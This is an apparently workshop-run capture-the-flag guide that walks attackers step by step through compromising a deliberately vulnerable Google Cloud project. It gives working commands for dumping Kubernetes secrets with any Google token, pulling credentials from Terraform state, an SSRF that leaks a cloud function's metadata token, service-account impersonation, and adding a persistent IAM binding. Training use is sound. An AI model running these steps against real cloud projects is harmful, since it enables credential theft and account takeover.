# CTF Guide

## Your Goal

Your goal of this CTF is to exploit a vulnerable GCP project and find up to 5 flags.
During the challenge you will be able to move through the environment and step by step escalate your privileges until you manage the IAM bindings on the project, esentially allowing you to gain control of all resources in the project.
(In our CTF workshop setup, we have to keep you in check a bit and you will only be able to manage specific IAM bindings.)

## Prerequisites

To play this CTF and participate in our workshop you will need:
- A notebook and an internet connection
- A Google account. Any Google account such as `your-throwaway@gmail.com ` is enough. It does not have to be a Google Cloud account. 
- The [gcloud](https://cloud.google.com/sdk/docs/install) command line utility installed on your computer.
- The kubectl utility installed on your computer. You can install it as a component of gcloud: `gcloud components install kubectl`

## Your starting point

The cloud services in the project might be misconfigured or leak information that can be useful for you as attacker.
You'll start out with just an IP address as your first piece of information.

We are providing you with useful hints and commands for each challenge.
Don't hesitate to use them, as you will have limited time for this CTF during our workshop.

## Challenges

### Challenge 1: Cluster confidentials

You received just an IP address as your very first entrypoint into the GCP project.  
Which ports are open? Is something listening here?  
Does it give you an idea what kind of infrastructure it is?

To simplify your next commands, set the IP address as an environment variable: `export IP=<IP>`

<details>
  <summary>Hint 1</summary>

    You found a GKE (Google Kubernetes Engine) cluster.  
    As you are not authenticated, you are part of the group `system:anonymous` and you can't access much.  
    What if you were in `system:authenticated`?  

</details>
  

<details>
  <summary>Hint 2</summary>
    
    `system:authenticated` sounds like strict access control - but is it?  
    All you need to do is authenticate - with pretty much any Google account.  
    What if you can get a token for your own Google account and provide that to the API?  
    Are there any endpoints you can access now?  
    
</details>
  

<details>
  <summary>Hint 3</summary>

    `system:authenticated` will require you to present a Google access token.  
    It can be any token - also for your own Google account that is not associated with our target GCP project.  
    You can use the [oauth playground](https://developers.google.com/oauthplayground/) to get an access token.  
    Select "Kubernetes Engine API v1" as a scope and exchange your authorization code for an access token.  
    To simplify the following commands, set your token in an environment variable: `export TOKEN=<your token>`  
    Present it to the GKE API:  
    `curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api`  
    That's a more promising response than `403 Forbidden1`!  
    Maybe you can find out, which permissions you have on the cluster as part of the `system:authenticated` group.  

</details>
  

<details>
  <summary>Hint 4</summary>

    It would be nice to know what you can access on the cluster.  
    Luckily, there is an endpoint for that too and you are allowed to query it:  
    `curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews`  
    It looks like you have read access to some resources on the default namespace of the cluster. Start enumerating some that might be interesting.  

</details>
  

<details>
  <summary>Hint 5</summary>

    You can read all resources in the `file-uploader` namespace on the cluster. Which secrets might it hold?  
    `curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets`  
    The secret values are base64 encoded. Decode them to read the value:  
    `echo -n <secret-value> | base64 -d  

</details>
  

Useful commands and tools:

- `nmap -sC -sV <IP>` (don't worry if you don't have nmap installed. Guessing common open ports also works here)
- `curl -k https://<IP>`
- `curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/...`
- [Google OAuth Playground](https://developers.google.com/oauthplayground/)

### Challenge 2: State of affairs

You found credentials for a GCP service account.
The json blob already provides some useful information. It contains the GCP project ID, the e-mail of the service account (client_e-mail) and the private key of the account.  

Save the json blob in a file. You can now also use it as a credential for the gcloud CLI:  
`gcloud auth activate-service-account --key-file <path-to-file>`  
You can check that this worked when running `gcloud auth list`. It now shows the service account as active account.  

So what can you do with this account? Did you find any hints during challenge 1?

<details>
  <summary>Hint 1</summary>

    In the configmap and deployment of the app ond the GKE cluster, you can find the name of a storage bucket.  
    Probably the service account you found belongs to this app and it can access the storage bucket.  

</details>

<details>
  <summary>Hint 2</summary>

    The file uploader app running on the GKE cluster can access a storage bucket called "file-uploads-<gcp-project-id>.  
    While the service account can't list all storage buckets, it might still have access to this specific bucket.  

</details>

<details>
  <summary>Hint 3</summary>

    See what you can find on the bucket by using the `gsutil` command line utility.  
    `gsutil ls gs://<bucket-name>`
    While the service account can't list all storage buckets, it might still have access to this specific bucket.  

</details>

Useful commands and tools:

- gsutil (already installed with gcloud): gsutil ls gs://<...>

### Challenge 3: Computing power

The file on the storage bucket is pretty useful for you as attacker.  
That seems to be the leftovers of a terraform pipeline that someone set up for this GCP project.  
They deployed parts of the infrastructure with terraform and you can trace back what the developers did in the terraform state file.

Would that help you to move on into other infrastructure deployed here?

<details>
  <summary>Hint 1</summary>

    The state file contains the parameters that were used to setup a Google Compute Engine VM.  
    But additionally, it contains a secret ...  
    Can you combine this information to access the VM?

</details>

<details>
  <summary>Hint 2</summary>

    The state file contains the parameters that were used to setup a Google Compute Engine VM.  
    But additionally, it contains a secret ...  
    Can you combine this information to access the VM?

</details>

<details>
  <summary>Hint 3</summary>

    The state file conveniently contains the external IP address of a compute engine that was deployed with terraform.  
    But someone also created a Google Secret Manager secret with terraform and specified the secret value as well.  
    If you do that, you have to protect your state file as well, as it will contain the secret value in plain text.  
    Use the SSH key you find in the secret to SSH into the VM.  

</details>

Did you find the flag yet for this challenge?  

<details>
  <summary>Hint 1 - find the flag</summary>
    
    Flags are just metadata anyway ...
    Still, can you find it?

</details>

<details>
  <summary>Hint 2 - find the flag</summary>

    The GCP metadata server is a good endpoint to check when you gained access to a compute VM.  
    If you don't have the VM's access token yet, you could get it from the metadata server.  
    It also shows you startup scripts, ssh access information and any other custom data that someone might have stored as metadata for this VM.  
    `curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"`  

</details>


### Challenge 4: Invoking answers

You can controll a compute instance in the project!  
Let's look around a bit to find out what this instance can do and which other services are running in this GCP project.  
Your compute instance is running as a GCP service account, allowing it to interact with the GCP APIs.  
Check which service account this instance uses and what this account can do.  

`gcloud auth list` shows you who you are.  
That account looks like the compute engine default service account! A very powerfull account in GCP.  
By default, it has the "Editor" role on a GCP project! But before getting too excited ... try using some of your new powers:  
`gcloud compute instances list`  

"Request had insufficient authentication scopes". Well, that's disappointing.  
You can list your oauth access scopes with this command:  
`curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)`

That last access scope looks promising.

<details>
  <summary>Hint 1</summary>

    The access scopes of the compute engine allow you to read all storage buckets in the project.  
    `gcloud storage buckets list`  
    There is a second bucket that you couldn't access before.  
    Its content reveals another resource deployed in this project.  
    `gsutil ls gs://<bucket-name>` lets you list files on the bucket.  
    `gsutil cat gs://<bucket-name>` lets you read files on the bucket.  

</details>

<details>
  <summary>Hint 2</summary>

    A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. Have a look at the source code to see what this small function does.
    You can find additional hints on how to invoke the function on the compute engine VM.  

</details>

<details>
  <summary>Hint 3</summary>

    A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. Have a look at the source code to see what this small function does.
    You can find additional hints on how to invoke the function on the compute engine VM.  

</details>

<details>
  <summary>Hint 4</summary>

    Can you call the function from the VM? It responds with 403 Forbidden when you try it without credentials.  
    Maybe you can pass your VMs token as a credential as Authorization header? `curl -H "Authorization:Bearer <token>" https://...`  
    Your access token doesn't seem to work through. Is there another token type you could try?

</details>

<details>
  <summary>Hint 5</summary>

    Cloud functions use an identity token instead of an access token to check if the caller is allowed to invoke them.  
    You can get the identity token of the compute VM in the same way as you would do it for the access token:  
    `gcloud auth print-identity-token`  
    Now you can try calling the function:  
    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" https://<function-endpoint>`  
    It seems to expect a URL and then it returns the response.  

</details>

<details>
  <summary>Hint 6</summary>

    Which endpoint could you have the cloud function call?  
    Similar to the compute engine, the cloud function also uses the Metadata server ...

</details>

<details>
  <summary>Hint 7</summary>

    You can pass the URL to the metadata server to the function and have it call it.  
    This way, you can make it leak its access token.  
    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"} -H "Metadata-Flavor: Google" https://<function-endpoint>`  

</details>

Useful commands and tools:  

- the compute engine also has gcloud installed
- `gcloud auth list`
- `gcloud auth print-access-token`
- `gcloud auth print-identity-token`
- [GCP oauth access scopes](https://developers.google.com/identity/protocols/oauth2/scopes#storage)
- `gsutil ls gs://<..>`
- `gsutil cat gs://<..>`
- `curl -H "Authorization:Bearer <token>" https://...`
- [Metadata server](https://cloud.google.com/functions/docs/securing/function-identity#access-tokens)

### Challenge 5: Admin Impersonation

You extracted a new access token! Let's see what this one can do.  
You can use the tokeninfo endpoint again to find out:  
`curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=<token>`  
Cloud functions by default are also using the compute engine default service account - but with the full `cloud-platform` access scope!  

That should get you a set of nice new permissions on this GCP project.  
You can tell gcloud to use your new token by setting it as environment variable:  
`export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>`  

Now, let's try to list the IAM policy on this GCP project to see which project-level access your account has:  
`gcloud projects get-iam-policy <project-id>`

You are Editor on this project which allows you read and write access to almost all resources.  
Congratulations! You compromised this GCP project.  

**Bonus Challenge:**  
There is one last level of control you can achieve - gaining persistent access!  
Wouldn't it be nice if you could add your own Google account to this project?  
You can try to set an IAM binding on the project level. But while the compute account you compromised is powerful, it can't modify the IAM settings on the project.  
But maybe another service account can?  

Note: In this CTF challenge the only role you can grant your own Google account on the project level is "role/viewer".  

<details>
  <summary>Hint 1</summary>

    When listing the service accounts on the project, one sounds like a good target: The terraform pipeline project admin account.  
    Check if your compute service account can impersonate this account:
    `gcloud iam service-accounts get-iam-policy <terraform account>`  
    It does have the serviceAccountTokenCreator role, allowing service account impersonation!

</details>

<details>
  <summary>Hint 2</summary>

    By impersonation a service account, you can leverage the permissions that this account has.  
    When listing the IAM bindings on the project again, the terraform account has a role that sounds intriguing: Terraform Pipeline Project Admin.  
    This is a custom role the developers created for their terraform pipeline.  
    Let's see what permissions it contains:  
    `gcloud iam roles describe TerraformPipelineProjectAdmin --project <project-id>`  
    Perfect! The account that you can impersonate, can modify the IAM bindings on this GCP project.  

</details>

<details>
  <summary>Hint 3</summary>

    Add your own Google Account to the GCP project by running:  
    `gcloud projects add-iam-policy-binding <project-id> --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>`

</details>

When you completed the bonus challenge, you should be able to access this project in the cloud console in your browser.  
Log in with the Google account you just added.  

You finished the challenge and pwnd the vulnerable Google Cloud Project!

Useful commands and tools:


- list the IAM bindings on project level: `gcloud projects get-iam-policy <project-id>`
- list service accounts: `gcloud iam service-accounts list` 
- get IAM bindings showing who can control this service account: `gcloud iam service-accounts get-iam-policy <service account>`



Useful commands and tools:




